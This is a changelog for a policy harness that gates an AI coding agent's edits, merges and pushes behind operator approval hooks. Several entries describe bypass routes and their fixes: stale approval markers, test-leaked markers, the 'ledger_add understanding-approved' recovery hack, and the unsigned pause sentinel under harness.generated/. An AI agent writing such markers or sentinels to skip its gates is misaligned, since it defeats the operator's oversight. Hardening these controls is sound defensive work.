- **Policy `ux.run` examples for `mcp__agent-grounding__ledger_add` now name the `sessionId` parameter** (agent-tasks/426e7049, PR #206). When a policy gate (`review-before-merge`, `review-before-merge-bash`, `review-subagent-before-pr-create`, `review-subagent-before-pr-create-bash`, `dogfood-before-release`) blocked an MCP/Bash call, the rendered hint named the required content tag but NOT which `sessionId` to pass. The runtime gate evaluates against the current Claude session id, so an operator who bound `sessionId` to the tag UUID (the natural assumption, since the tag literally contains the task / PR number) saw the same opaque rejection repeated. Now all four `ux.run` lines emit `mcp__agent-grounding__ledger_add { sessionId: "${SESSION_ID}", type: "fact", content: "..." }` so the binding is explicit. **Operator action**: re-run `harness apply` (or `harness init --force`) to regenerate `settings.json` with the updated hints; existing operators see no functional change in gate behaviour, only clearer hints on the next block. New pin-test in `tests/cli/init-composer.test.ts` asserts every ledger-add-producing policy includes the sessionId in its example.

## [0.23.1] - 2026-05-18

**Headline: memory-router wiring hotfix.** Same-day patch on v0.23.0. The Full profile's `memory.router` declaration was never translated into a UserPromptSubmit hook by `harness apply` — operators saw the wizard report `memory-router-user-prompt-submit (already installed)` but the binary never actually fired because `settings.json` / `config.toml` only got the understanding-gate hook. PR #203 closes the wiring gap on both runtimes; PR #204 is the defence pair that reserves the `memory:` hook-name prefix at schema validation time so the synthetic projection can't silently collide with an operator-declared hook of the same name. **Operator action**: re-run `harness apply` (or `harness init --force`) to pick up the wiring; the synthetic hook fires alongside the gate.

### Fixed

- **Schema rejects `hooks[].name` starting with reserved `memory:` prefix** (agent-tasks/57847bff, PR #204). Defence pair for PR #203's synthetic memory-router projection. The synthetic hook is injected by `harness apply` AFTER `HooksSchema` validates `manifest.hooks[]`, so without this guard an operator who happened to declare a hook named `memory:router` would silently produce two entries with the same name in their generated `settings.json` / `config.toml`. Now `parseManifest` throws at parse time with a clear error pointing at the synthetic-projection convention. Reserved prefixes are listed in `RESERVED_HOOK_NAME_PREFIXES` in `src/schema/hooks.ts` as the single source of truth for future synthetic projections. Whole-prefix check (`startsWith`), not whole-string match: future `memory:*` projections (e.g. `memory:retention`) are pre-reserved without needing another schema bump. Substring matches that do not start with the prefix (e.g. `policy-pack:memory:router`) are unaffected. Technically breaking if anyone in the wild used `memory:` as a hook-name prefix (no known instances; the convention `<scope>:<name>` for hook names is established but `memory:` was never documented as valid for operator use). **If you hit this error**, rename to `<your-scope>:memory-<name>` (e.g. `policy-pack:memory-cleanup`) or drop the `memory:` prefix entirely. The check is case-sensitive on purpose so `Memory:` variants still parse if you have a specific reason to keep something close to the namespace. 4 new pin-tests.
- **`harness apply` silently ignored `memory.router`, memory-router was never wired as a UserPromptSubmit hook** (agent-tasks/eefbcaa8, PR #203). Since the `memory.router` field was added to the manifest schema, the apply projection in `generate-settings.ts` and `generate-codex-config.ts` consumed `manifest.hooks[]` + `manifest.tools.mcp[]` but never read `manifest.memory.router`. Operators who set up the Full profile via `harness init --interactive` got the binary installed (the wizard reports `memory-router-user-prompt-submit (already installed)`) and the manifest written with `memory.router.enabled: true`, but `settings.json` ended up with only `understanding-gate-claude-hook` on UserPromptSubmit. Every prompt to Claude Code passed through the gate WITHOUT memory-router augmentation, so the per-prompt memory injection / context-relevance scoring the router was designed for simply never ran. Discovered by an operator who session-dumped the active hook chain and noticed the router was missing despite the wizard's confirmation. **Fix**: both Claude Code (`settings.json`) and Codex (`config.toml`) projections now translate `memory.router` into a synthetic `UserPromptSubmit` hook when `enabled !== false`. The synthetic hook forwards `min_version` / `version_command` so `harness doctor` continues to probe the router binary the same way it would any other hook with a declared floor. The router fires alongside the existing gate hook (lexical sort places it first). **Operator action**: re-run `harness apply` (or `harness init --force`) to pick up the wiring. Operators who declared `memory.router` aspirationally but never installed the binary should remove the `memory.router` block from the manifest first (or set `enabled: false`), otherwise Claude Code will spawn-fail per prompt now that the hook is actually wired. New pin-tests assert (a) enabled router projects into both runtimes, (b) `enabled: false` omits, (c) missing `memory.router` is a no-op, (d) co-existence with the gate hook puts both in the chain, (e) multi-token command arrays join with a single space, (f) `min_version` + `version_command` forward to the synthetic hook when both are set.

## [0.23.0] - 2026-05-18

**Headline: understanding-gate correctness + test-isolation hardening.** This release fixes a silent auto-bypass in the task-scoped understanding gate (`checkAnyTaskApprovalMarker` matched ANY fresh `.approvals/task-*` marker regardless of which task was actually claimed, so a single stale approval marker silently allowed every Edit/Write/Bash in every subsequent session) and closes the recurring test-isolation class that put that marker there in the first place. Three of the four PRs are the same incident chain: root-cause-fixed in #198 (`checkActiveClaimApprovalMarker` reads `active-claim` and consults ONLY that task's marker), GC'd in #200 (the legacy v1 `tasks_transition --status done` verb now releases the work claim and clears the marker symmetrically with v2's `task_finish → done`), defense-in-depth in #199 (a third leak instance triggered the architectural defense: `resolvePaths` throws unless `homeDir`/`configPath`/`HARNESS_ALLOW_REAL_GENERATED_DIR=1` is set, so future test callers fail loud instead of silently writing into the operator's real `~/.claude/`) and #201 (the manual acceptance smoke from #199 is now an opt-in vitest case). **Operator action**: re-run `harness apply` after upgrading to pick up the new PostToolUse matchers for `tasks_transition`; the existing `task_finish / task_abandon / pull_requests_merge` matchers continue working without re-apply.

### Added

- **Integration pin for operator-state-isolation acceptance smoke** (agent-tasks/5107504c, PR #201). PR #199 verified its acceptance criterion ("vitest suite still passes when the operator has a real `harness pause` sentinel pre-written") manually but did not encode it. This adds `tests/integration/operator-state-isolation.test.ts`: snapshots the real sentinel, plants a 1h-expiry test sentinel via `writeSentinel`, spawns a `vitest run --exclude tests/integration/**` subprocess, asserts exit 0, restores prior state in `try/finally` so a test crash never leaves a phantom sentinel behind. Gated by `HARNESS_INTEGRATION_TESTS=1` via `describe.skipIf` so default `npm test` shows `1 skipped` (no second-spawn overhead on the CI hot path). New `npm run test:integration` script flips the env var on. The spawn approach is load-bearing: an in-process re-run would self-contaminate (inner test discovers the outer's planted sentinel and the recursion would corrupt restore).
- **Marker-GC matcher covers legacy v1 `tasks_transition` verb with status filter** (agent-tasks/9e06175f, PR #200). Closes the GC half of the gate auto-bypass class that PR #198 fixed at evaluation time. Before this, `tasks_transition --status done` (the v1 way to close a task, still used by scripts and external integrations) did NOT fire either the `track-active-claim` or `post-tool-use` PostToolUse hooks, so the work-claim file and the operator's approval marker lingered after the task ended. PR #198 made the leftover marker inert (the gate now scopes to active-claim), but the marker itself stayed in `.approvals/` until manual cleanup. Both hooks now also match `mcp__agent-tasks__tasks_transition` with an in-hook status filter: `status === "done"` releases the claim and clears the marker (matching `task_finish` → done semantics), every other value (`open`, `in_progress`, `review`, missing, malformed) is a no-op so the work claim and marker survive in-flight transitions. Mirrors the v2 contract that `task_finish → review` keeps the work claim, only `→ done` releases. Updated: `TRACK_ACTIVE_CLAIM_MATCH` regex, `DEFAULT_EXPIRE_ON_TOOL_MATCH` array, two test-relevant hooks (`hook-track-active-claim`, `hook-post-tool-use`), three init template sources (`profiles.ts`, `templates.ts`, `composer.ts`), and both manifest goldens (`full-manifest.yaml`, `full-manifest.expected.yaml`). 8 new tests across the two hooks cover each status value plus the missing-status defensive path. **Operator action**: re-run `harness apply` to pick up the new matchers; existing installs continue working (their settings.json simply doesn't fire the hook on `tasks_transition` events, which is the pre-PR behaviour) but will keep accumulating inert task markers AND a stale `active-claim` file (the `track-active-claim` matcher symmetrically gains the new tool, so a single `harness apply` refreshes both surfaces). **Known limitation**: `tasks_transition --status open` (manual release / unclaim) is treated as no-op rather than clear. In practice `open` is rare (release uses the dedicated `tasks_release` v1 verb) and the worst case is a stale marker that the next claimant either matches or replaces; if you exercise the `open` path routinely, file a follow-up.
- **`resolvePaths` test-isolation guard via `HARNESS_ALLOW_REAL_GENERATED_DIR` env opt-in** (agent-tasks/3692cdf4, PR #199). Third incident in the recurring "test silently reads/writes the operator's real `~/.claude/`" class. v0.21.1 fixed preflight stage; v0.22.0 fixed `approveUnderstanding` markers; this one closes the architectural hole that lets the class re-spawn at every new call site. `resolvePaths` now throws unless one of `homeDir`, `configPath`, or `process.env.HARNESS_ALLOW_REAL_GENERATED_DIR === "1"` is set. The harness binary (`src/cli/main.ts`) sets the env var before invoking `run()`; tests do not, so any future test caller that forgets to inject `homeDir` / `generatedDir` fails loudly at the assertion site instead of silently mutating operator state. Surfaced 23 latent leak sites on first run (21 in `approve-understanding.test.ts`, 1 in `pack-hook-codex-stop.test.ts`, 1 in `session-start/preflight.test.ts`); all addressed in the same PR via lazy `resolvePaths` evaluation when the relevant override is already supplied (e.g. `reportsDir`), or by adding `homeDir: tmp` to the test caller. New pin-test at `tests/cli/loader-isolation.test.ts` (5 cases) asserts the throw fires when expected and the env-var opt-in re-opens the fallback. Acceptance smoke: full vitest suite (1520 / 1520) passes with a fake `harness pause` sentinel pre-written into the operator's real `~/.claude/harness.generated/.harness-paused`, confirming no test short-circuits because of operator state.

### Fixed

- **Understanding-gate silently auto-bypassed via any stale task marker, active-claim ignored** (agent-tasks/a13a537b, PR #198). `checkAnyTaskApprovalMarker` scanned `<gen>/.approvals/` and matched the FIRST fresh `task-<id>` marker it found, regardless of whether that task was the currently-claimed one. A single approval marker left lying around (typical pattern: operator approves task A, the marker is not GC'd at task A's completion, a fresh session picks up task B and never sees an understanding-gate prompt) silently auto-allowed every Edit/Write/Bash in every subsequent session until the marker aged out. Discovered when an operator on a freshly-assigned task ran the pre-tool-use hook by hand and watched it report `task-scoped marker for task <unrelated-id>: approved at <hours ago> by harness-approve-cli, allowing` for a task that had been merged earlier the same day. The behaviour was design-by-comment ("Any fresh `.approvals/task-<id>` marker satisfies the gate, regardless of which session approved it") but the comment encoded the bug: a session-agnostic check is exactly what makes a task-scoped marker secure across sessions; a task-agnostic check is what makes it insecure across tasks. Replaced with `checkActiveClaimApprovalMarker`, which reads `<gen>/active-claim` and ONLY consults the marker for that specific task. When `active-claim` is absent (legacy / solo workflows that never call `task_start`), the new function returns `matched:false` and the gate falls through to the session marker, preserving the legacy contract. `checkAnyTaskApprovalMarker` is removed from the runtime surface (only one internal caller). New tests pin the security contract: a `task-OTHER` marker plus an `active-claim` pointing elsewhere now blocks. **Operator cleanup**: list `.approvals/task-*` entries whose UUIDs do NOT match any task you are currently working on, and rm those that pre-date the next `task_start`:

```bash
ls ~/.claude/harness.generated/.approvals/task-* 2>/dev/null
# For each entry: confirm the task is closed, then rm it.
cat ~/.claude/harness.generated/active-claim
# Markers whose taskId does not match this file are inert under the
# new gate; they can be removed without affecting any live approval.
```

## [0.22.0] - 2026-05-18

**Headline: two operator-experience deliveries in one release.** First, `harness pause` / `harness resume`, two operator-only verbs that make every PreToolUse / PostToolUse pack hook dormant by writing a JSON sentinel under `harness.generated/`. Replaces the `ledger_add understanding-approved:<sessionId>` lockout-recovery hack, the comment-out-and-readd `settings.json` dance for gate debugging, and the no-clean-answer incident-hotfix path; the operator-only guardrails (refuses agent shell, refuses non-TTY) keep it from becoming a routine bypass. Second, a critical test-isolation fix: every `npx vitest run` since v0.20.0 silently wrote `.approvals/task-<real-task-id>` markers into the operator's real `~/.claude/harness.generated/.approvals/`, auto-approving whatever task the live `active-claim` pointed to and short-circuiting the understanding-gate. Same class as the v0.21.1 preflight leak; this release fixes 10 leak sites and adds a pin-test that asserts no writes happen under real `~/.claude/` for any future `approveUnderstanding` test caller.

### Added

- **`harness pause` / `harness resume`: sentinel-based hook bypass without unwiring** (harness/07850f73, PR #196). New operator-only verbs write a JSON sentinel under `<generatedDir>/.harness-paused`; every PreToolUse / PostToolUse pack hook (`pre-tool-use`, `codex-pre-tool-use`, `post-tool-use`, `track-active-claim`, `branch-protection`) checks the sentinel before evaluating and short-circuits to allow plus a one-line stderr notice while it is active. Auto-resume on first hook fire past the expiry. Default window is 15 minutes; `--for <duration>` accepts the same shorthand and ISO-8601 forms `requires.within` does. `--indefinite` exists for genuinely open-ended recovery flows but requires `--i-am-the-operator-and-accept-no-auto-resume` as a separate verbose flag, so the friction itself discourages routine indefinite-pausing. Each pause / resume / auto-expiry also writes an `harness-paused:<pausedAt>` / `harness-resumed:<pausedAt>` evidence-ledger fact in the synthetic `default` session bucket so the audit trail outlives the ephemeral sentinel file. Intended for three narrow flows: lockout recovery (replaces the `ledger_add understanding-approved:<sessionId>` hack documented in `feedback_understanding_gate_lockout_recovery`), "is this harness or my code?" debug A/B-tests, and incident hotfix mode. NOT a routine bypass: the load-bearing guardrail is `harness pause` refuses to run when `$CLAUDE_SESSION_ID` is set (always set inside an agent shell) AND refuses non-TTY stdin without `--i-am-the-operator`. For permanent per-policy disable, edit `policies[].enabled` in the manifest, pause exists for the temporary case only. New docs section in `docs/for-humans.md` enumerates the boundary; the trust-boundary callout recommends a blanket Write deny on `harness.generated/` for operators with restrictive policies, since the sentinel file has no signature. `harness audit --since 24h` surfaces the ledger trail alongside policy decisions. 38 new tests across sentinel I/O, the CLI verbs, and pair-tests (pause + hook + resume + hook for both understanding-before-execution and branch-protection).

### Fixed

- **Test isolation: `approveUnderstanding` test callers leaked task markers into operator's real `~/.claude/harness.generated/`** (agent-tasks/b5a743fc). Same class as the v0.21.1 preflight side-effect leak. 9 sites in `tests/cli/approve-understanding.test.ts` and 1 in `tests/cli/pack-hook-codex-stop.test.ts` called `approveUnderstanding({ manifest, session, reportsDir })` without `generatedDir`/`homeDir` injection. `resolvePaths()` defaulted to the operator's real `~/.claude/harness.yaml`, then `~/.claude/harness.generated/`, and the call wrote `.approvals/<sessionId>` (test fixture session id) AND `.approvals/task-<real-task-id>` (read from the operator's real `active-claim` file, written by the v0.20.0 `track-active-claim` PostToolUse hook on `task_start`) into the real dir. The task-scoped marker silently auto-approved whatever task the operator was currently on, short-circuiting the understanding-gate without them ever running `harness approve understanding`. Discovered when an operator with a fresh session asked why the gate did not fire for a newly-assigned task; forensics showed `task-<id>` markers with `approvedBy: harness-approve-cli` and timestamps matching exactly when `npx vitest run` was last executed. All 10 sites now inject `generatedDir`; new pin-test at `tests/cli/approve-understanding-isolation.test.ts` (mirrors `tests/cli/session-start/preflight.test.ts`'s `defaults to no staging` pattern from PR #195) catches future regressions by snapshotting `~/.claude/harness.generated/.approvals/` before and after a tmp-`homeDir` `approveUnderstanding` call and failing on any new entry. **Operator cleanup**: if you ran `npx vitest run` against the harness repo any time since v0.20.0 (2026-05-18), list the test-leaked markers in your real approvals dir. Filter on NAME shape: legitimate markers are keyed by UUID (session id or `task-<UUID>`); test fixtures use literal names like `sess-1`, `sess-stop-roundtrip`, `task-uuid-abc`, `task-isolation-pin-test-task`. Note that filtering on `approvedBy` does NOT work, the test fixture and the real `harness approve understanding` CLI share the same default `harness-approve-cli` actor string, so an `approvedBy`-only grep would also match your legitimate approvals. The safe filter is name-shape:

```bash
UUID='[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
ls ~/.claude/harness.generated/.approvals/ 2>/dev/null \
  | grep -vE "^(task-)?${UUID}$"
# Inspect the list, then rm only the entries that match. Real operator
# approvals are never matched by this filter because their names are UUIDs.
``` Follow-up filed at agent-tasks/3692cdf4 for the lower-severity hook-test READ dependency on the same path (34 hook callers inherited a passive read from the pause-sentinel check added in PR #196, but no write leak).

## [0.21.1] - 2026-05-18

### Fixed

- **preflight staging side effect must be opt-in, not default-on**. v0.21.0 made `runSessionStartPreflight` write `<generatedDir>/.pending-approval` automatically as the bootstrap fix from PR #193. The default-on behaviour leaked through to vitest: every existing test that calls `runSessionStartPreflight` without isolating `homeDir` clobbered the operator's real `~/.claude/harness.generated/.pending-approval` with whatever literal session_id the test happened to pass. The leak surfaced live because `harness preflight` runs `agent-preflight`, which includes an `npm-test` check, which spawns vitest, which writes "real-uuid" (a test fixture string) to the real pending-approval file. `harness approve understanding` then resolved to "real-uuid" instead of the operator's session. Hotfix: the staging side effect is now opt-in, the CLI entry points (`harness preflight`, `harness session-start preflight`) wire `writePendingApproval` explicitly so operators still get the bootstrap fix; library callers (and every vitest case) get the no-op default. New regression test pins the default-off behaviour with an on-disk side-effect assertion. Caveat: this is a self-inflicted-via-our-own-test-fixture bug, but the user-visible effect (approve resolving to the wrong session) was severe enough to merit a same-day patch release.

## [0.21.0] - 2026-05-18

**Headline: preflight and approve ergonomics, two friction loops closed.** v0.20 documented (PR #186) that a preflight from earlier in the session does not cover a push that landed a new commit since, the time-window check was the only freshness mechanism. v0.21 closes the loop with `at_head: true`: a preflight whose recorded HEAD equals the current HEAD now satisfies the gate at any age, so the per-commit re-preflight churn disappears when nothing structural changed. The other loop: `harness approve understanding` (no flags) used to require a prior PreToolUse gate-block to have staged the session id, making the proactive "Understanding Report at task start" flow impossible without manual `--session <id>` coordination. `harness session-start preflight` now stages the same `.pending-approval` file as a side effect, so an arg-less `harness approve` works right after the first preflight. Two small wizard polish drops round out the release: the Full profile picker no longer claims "5 reference policies" (it has been 8 since v0.20's Bash-surface parallels), and the post-validate reminder for Full now correctly names both the agent-tasks MCP AND `gh pr (merge|create)` Bash surfaces as gated.

### Added

- **preflight-before-push: HEAD-match freshness (`at_head: true`)** (agent-tasks/a0af50cb, PR #192, follow-up to PR #186). The `requires` block accepts a new optional `at_head: boolean` flag. When true, an evidence-ledger entry whose `head:<sha>` token equals the runtime-resolved current HEAD sha satisfies the gate regardless of `within`. The standard `harness session-start preflight` producer now writes `head:<sha>` into the tag content (loose ref read with packed-refs fallback; raw sha for detached HEAD). FULL_TEMPLATE's `preflight-before-push` policy sets `at_head: true` with `within: 10m` kept as the freshness ceiling for the head-mismatch case (operator switched branch, preflight predates HEAD shift, runtime couldn't resolve a sha). Eliminates per-commit re-preflight churn when nothing structural changed since the recorded preflight. Deny reason now names the drift explicitly: `(HEAD drift: last preflight at <7-char-sha>, current <7-char-sha>)`. Back-compatible: old ledger entries lacking `head:` continue to satisfy via the standard window check; policies without `at_head` behave unchanged.

### Fixed

- **`harness approve understanding` bootstrap: preflight now stages `.pending-approval`** (agent-tasks/0dbc9549, PR #193). Before this change, `harness approve understanding` (no flags) required a prior PreToolUse gate-block to have staged `<generatedDir>/.pending-approval` with the session id. That meant the proactive flow (operator writes Understanding Report at task start, then approves before any tool fires) was impossible: with no block, no staging, no usable session id, approve exit'd with `no session id available`. Now `harness session-start preflight` (which operators run anyway as the standard producer for `preflight-before-*` gates) writes the same staging file as a side effect whenever it resolves a non-default session id, so an arg-less `harness approve understanding` works right after the first preflight. Skipped when the resolved id is the literal `"default"` (would never satisfy any task-scoped gate anyway). Best-effort: a staging-file write failure never breaks the SessionStart hook loop. The error message for the still-no-session-id case now points at `harness preflight` as the one-command fix. Existing PreToolUse-block-then-approve flow unchanged. 4 new tests on the producer side, 1 on the consumer error-message side.

- **Wizard: Full profile picker drops the stale policy count** (agent-tasks/4cd6baf8, PR #190). `harness init --interactive`'s profile picker showed "Full (Team + 5 reference policies wired through harness policy intercept)". The "5" was off-by-one before v0.20.0 (FULL_TEMPLATE had 6 then) and drifted to 8 after PR #188's Bash-surface parallels. Replaced with "the reference policies" so the label survives future policy adds without re-drifting; the composer label at the same surface already used count-free phrasing.

- **Wizard: Full post-validate reminder names gh-cli + MCP coverage** (agent-tasks/c9ac78eb, PR #191). The reminder block at `interactive.ts:650-680` told both Team and Full operators that "the review-merge gate only matches agent-tasks MCP tool names today, not `gh pr` Bash calls". For Full that has been false since PR #188 added `review-before-merge-bash` + `review-subagent-before-pr-create-bash`. Split the reminder: Team text byte-identical; Full now names both surfaces, the tag-shape difference (`review:${PR_NUMBER}` MCP vs `review:${BRANCH}` gh-cli), and offers `--template team` or `--template solo` as fallbacks. Regression test in the Full describe block of `init-interactive.test.ts` asserts the new shape and rejects the stale Team-only wording.

## [0.20.0] - 2026-05-18

**Headline: two ergonomics gaps closed at the gate surface.** v0.18 introduced per-task understanding-gate marker expiry as opt-in via `--task <id>`; this release auto-resolves the active agent-tasks claim from a PostToolUse-maintained `active-claim` file, so operators with agent-tasks wired never need to type the UUID. The full template's PR-review gates also become tool-agnostic: parallel Bash-surface policies now guard `gh pr merge` / `gh pr create` alongside the agent-tasks MCP variants, with `${BRANCH}` substituting for `${PR_NUMBER}` / `${TASK_ID}` since the extract DSL cannot capture from `tool_input.command`. Two fixes close subtle bypasses: the marker-expiry mechanism now also flips the persisted-report `approvalStatus` from `approved` to `expired` (closing the multi-task silent-bypass that survived v0.18), and branch-protection gates on the target file's repo rather than the cwd's, so writes to memory or cross-repo edits stop falsely refusing when cwd happens to sit on master.

### Added

- **understanding-gate v2: auto-resolve active agent-tasks claim** (harness/494fd1e5, PR #187). v1 (PR #184) shipped task-scoped markers as opt-in via `--task <id>`. v2 closes the ergonomics gap: a new PostToolUse hook (`harness pack hook track-active-claim`) maintains `<generatedDir>/active-claim` from agent-tasks `task_start` / `task_finish` / `task_abandon`. `harness approve understanding` reads the file when `--task` is absent and auto-supplies the id. Operators with agent-tasks wired never need to type the UUID; the file is a one-line cat-able artefact. Without agent-tasks (or when no task is claimed), behaviour falls back to v1: only the session-scoped marker is written. `--task` takes precedence over the file when both are present, with the result payload's new `source: "flag" | "active-claim"` field telling the operator which surface fed the id. New runtime helpers: `writeActiveClaim`, `readActiveClaim`, `clearActiveClaim`, `activeClaimPathFor`, `ACTIVE_CLAIM_FILENAME`. 13 new tests across the hook + approve + apply surfaces. No cross-repo coordination needed: harness owns both the writer (PostToolUse hook) and the reader (approve verb), so agent-tasks-bridge stays untouched.

- **understanding-gate: task-scoped approval markers** (harness/1ee26e77, PR #184). The marker file the gate consults is now keyed by `task-<taskId>` in addition to `<sessionId>` when the operator passes `--task <id>` to `harness approve understanding`. Either marker satisfies the gate, but the task-scoped one is the design-intent target for multi-task sessions: when the task ends, the post-tool-use hook extracts `tool_input.taskId` from the matched MCP boundary tool (e.g. `mcp__agent-tasks__task_finish`) and deletes the specific task marker (in addition to the session marker, as today). Without `--task`, behaviour is unchanged, the session marker is the only one written, fall-through semantics preserve every existing flow. New helpers in the runtime module: `writeTaskApprovalMarker`, `checkAnyTaskApprovalMarker`, `clearTaskApprovalMarker`, `taskApprovalMarkerPathFor`. 8 new tests across approve / pre-tool-use / post-tool-use surfaces. The intent: enable the cross-session continuity case (operator approved task A from session X, agent continues task A in session Y so the approval still holds) without disrupting the legacy per-session contract for solo workflows.

- **Tool-agnostic PR-review gates (Bash-surface parallels)** (harness/7eed0bb2, PR #188). The full template now ships `review-before-merge-bash` and `review-subagent-before-pr-create-bash` alongside the existing agent-tasks MCP variants, so `gh pr merge` / `gh pr create` get the same review-evidence gate. A `PolicyTrigger` can only AND-match one surface (MCP tool-name OR Bash command), so two parallel policies are the minimum-scope answer (V3 from the deferred-2026-05-17 task analysis, picked over a schema-bump V1 that would have introduced a new Array `match` form plus regex-capture from Bash stdout for a single use case). Tag shape switches to `${BRANCH}` on the Bash side because no `PR_NUMBER` / `TASK_ID` is extractable from `tool_input.command` via the JSONPath-only extract DSL. Hybrid operators using both surfaces get both gates active with two tag shapes, which is honest at the ledger layer. New worked example in `docs/writing-custom-policies.md` ("Same gate, two PR-surface variants") plus pointers in `docs/for-humans.md` and `docs/init-interactive.md`.

### Fixed

- **understanding-gate: persisted-report bypass** (harness/1ee26e77 root-cause follow-up, PR #185). Forensics on a multi-task session that didn't re-prompt: PR #172 (v0.18, May 17) shipped marker-expiry on task_finish but only deleted the FILESYSTEM MARKER, not the persisted JSON report at `.understanding-gate/reports/...json`. The pre-tool-use gate falls through to the persisted report when the marker is absent, so the report (still `approvalStatus: "approved"`) silently kept satisfying the gate after task_finish. The marker-expiry mechanism was performing its half of the contract, the report's half was missing. This patch closes the gap: the post-tool-use hook now also flips the matching report's `approvalStatus` from `approved` to `expired` (with an `expiredAt` timestamp), atomic rewrite, operator's report body preserved for audit. Hook command is now wrapped with `UNDERSTANDING_GATE_REPORT_DIR` so it resolves the same reports directory the pre-tool-use blocker uses. 3 new tests on the post-tool-use surface (flips approved → expired, degrades gracefully when no reports exist, idempotent on already-expired). Without this fix, the v1 task-scoped marker work from PR #184 was load-bearing on the marker path only, which the bypass would have continued to defeat.

- **branch-protection: gate on target path, not cwd** (harness/efdbfa0b, PR #183). The branch-protection PreToolUse hook resolved the branch via `resolveGitContext(cwd)`, so any Write / Edit / MultiEdit / NotebookEdit fired from a checkout on master got refused regardless of where the target path actually lived. Two practical cases hit every session: (1) writes to `~/.claude/memory/*.md` (outside any git repo at all) blocked when cwd was on a protected branch elsewhere; (2) cross-repo edits when cwd was on a protected branch in repo A and the target file lived in repo B on a feature branch, same wrong refusal. Fix introduces `extractTargetPath(toolName, toolInput)` for the single-file mutator tools and resolves the branch context from `dirname(targetPath)` instead of cwd. Relative paths resolve against cwd before the dirname walk. Tools without a single resolvable target (Bash, search verbs) fall back to cwd as before. Same-repo writes on a protected branch still block, the substance of the gate is unchanged, only its anchor moved. 6 new tests, 23 total in the file. Subsumes duplicate friction 5427e455.

### Changed

- **preflight-before-push gate message: explain the post-commit re-run requirement** (harness/ec7390c9, PR #186). The error said "a fresh preflight for `${BRANCH}` (within the last 10 minutes)", technically correct but hid the load-bearing detail: a preflight from earlier in the session does not cover a push that landed a new commit since. Result was "I just ran preflight, why is the gate blocking?" and a round-trip to docs. The required clause now splits the two cleanly: state the gate's actual check (time window) and give the operator-side rule (re-run after each commit) as a "what you need to do" hint rather than a "what the gate verifies" claim, since today only the time check is enforced. Same wording mirrored to `templates.ts`, `composer.ts`, the canonical `docs/examples/full-manifest.yaml` example, and its expected-render snapshot used by the parity test. The heavier half (HEAD-match freshness so any preflight whose recorded HEAD matches current HEAD satisfies the gate, removing the per-commit re-preflight churn entirely) is filed as a follow-up at agent-tasks/a0af50cb.

## [0.19.0] - 2026-05-17

**Headline: setup UX gap closed for non-agent-tasks operators.** Through v0.18.x several pieces of the harness experience silently degraded for operators picking Solo (or Team without an agent-tasks account): the new per-task understanding-gate marker expiry never fired because the configured boundary list was agent-tasks MCP names, `harness init --interactive` left the bridge wired but unauthenticated, `harness doctor` flagged the deliberately operator-driven `dogfood-before-release` policy as a missing-producer false positive, and an nvm-drift class of bug went undiagnosed. This release closes those four gaps: profile-aware reset defaults plus a new `expire_on_bash_match` regex list for gh-CLI workflows, a post-install auth probe with login / skip / abort dialog, doctor respect for the policy's own `producers:` array, and a doctor warning that catches when `npm prefix -g`'s bin dir is not on PATH. Doc cleanup made the external-account assumptions of each profile explicit up-front.

### Added

- **understanding-gate: `approval_lifecycle.expire_on_bash_match`** (harness/f54e0ecb). New optional schema field on the `understanding-before-execution` pack config: a string array of regex patterns matched against the `Bash` tool's `tool_input.command`. When a Bash command matches, the per-session approval marker is deleted on PostToolUse, same semantics as the existing `expire_on_tool_match` does for MCP tool names. Enables gh-CLI / pure-Bash workflows to declare task boundaries (e.g. `^gh pr (merge|close)\b`, `^git push origin (master|main)\b`) so the gate's per-task re-prompt works for them too. Profile defaults updated: Solo drops the agent-tasks tool list (dead weight there) and ships only the Bash list with `max_age: 1h`; Team and Full keep the tool list and add the Bash list for hybrid coverage. Patterns are pre-compiled at parse time, invalid regexes dropped with stderr warnings. Round-trip regression tests in `tests/cli/init-full-template-pins.test.ts` parse each template through `yaml.parse + new RegExp + .test()` to pin the escape-pipeline correctness, since the unit-level tests bypass that surface.

- **`harness doctor`: warn when `npm prefix -g`'s bin dir is not on PATH** (harness/4ddd78ed). Surfaces the nvm-drift footgun where `harness init --interactive` runs `npm i -g` against the active Node's prefix but the operator's shell PATH points at a different one, so installed binaries are silently invisible to subsequent doctor probes. Doctor now resolves the bin dir via `npm prefix -g` (the modern replacement for the removed `npm bin -g`) and renders an `Environment` section with the actionable PATH-patch suggestion when the bin dir is not in `process.env.PATH`. The section stays absent on ok and on the unknown branch (npm missing); skipped under `--shallow` so the 100ms timing budget stays intact.

- **`harness init --interactive`: post-install auth probe for the agent-tasks bridge** (harness/3f775180). After a successful `npm i -g @agent-tasks/mcp-bridge`, the wizard runs `agent-tasks-mcp-bridge status` to detect whether a token is configured. Three branches:
  - **ok**: prints `✓ agent-tasks token validated against the backend.` and continues.
  - **token present but validation fails** (backend unreachable, expired token, wrong base URL): prints an informational warning naming the bridge's reason and continues. The wizard does not block on this because the recovery is not actionable from inside it.
  - **no token stored**: opens a three-option dialog: (a) run `agent-tasks-mcp-bridge login` interactively now via stdio pass-through, (b) skip with a reminder, (c) abort the wizard with a pointer to the signup URL and the re-run command. After a successful login the wizard re-probes to confirm.

  Closes the silent footgun where a fresh operator could finish the wizard with `harness doctor` reporting all-green but every `mcp__agent-tasks__*` call returning an auth error.

- **FULL_TEMPLATE `git-preflight` hook pin: `min_version: "0.1.1"` + `version_command: ["preflight", "--version"]`** (agent-preflight/cb5a1770). Same pattern as the existing pins for `agent-tasks-mcp-bridge`, `grounding-mcp`, `memory-router-user-prompt-submit`. Floor at agent-preflight 0.1.1, the release that distinguishes "tool not installed" (e.g. an npm script invoking eslint that is not in devDependencies) from real lint/test/typecheck failures. Stale 0.1.0 installs silently emit false-positive blockers that keep the `preflight-before-*` policies closed forever; with the floor wired, `harness doctor` now warns operators to upgrade.

### Changed

- **`harness doctor`: producer-gap warning now respects the policy's own `producers:` array** (harness/f97e152f). A `block` policy with a `within:` window used to be flagged with `⚠ ... no manifest hook produces it` whenever no automatic SessionStart hook wrote the required tag, even when the policy itself declared a `producers:` entry pointing the agent at the manual recovery (`mcp__agent-grounding__ledger_add`). For `dogfood-before-release` in the Full template that was a false positive: the gate is deliberately operator-driven (an automatic SessionStart producer would defeat its purpose), and the `producers:` array IS the schema-blessed manual recovery path the agent sees in the deny envelope. Doctor now treats a non-empty `producers:` array as a documented producer and suppresses the warning. The warning still fires when both kinds are absent. Visible effect on the Full template: one fewer false-positive warning (dogfood-before-release flips from `⚠` to `✓`); the two preflight policies were already satisfied by the `git-preflight` SessionStart hook and stay green.

